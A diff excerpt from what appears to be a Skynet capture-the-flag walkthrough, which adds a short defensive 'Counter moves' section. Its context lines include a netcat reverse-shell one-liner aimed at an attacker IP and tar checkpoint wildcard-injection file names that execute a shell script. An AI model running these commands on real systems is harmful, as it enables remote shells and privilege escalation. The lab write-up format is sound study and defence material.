@@ -504,3 +504,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attck ma
 touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1"
 ```
+
+## Counter moves
+
+Skynet chains an exposed service and a scheduled task into root. Service hygiene and baseline monitoring of scheduled tasks are the levers. The defender's view is in the blue notes on [the gap between access and authority](https://blue.tymyrddin.dev/docs/counter/escalation/).
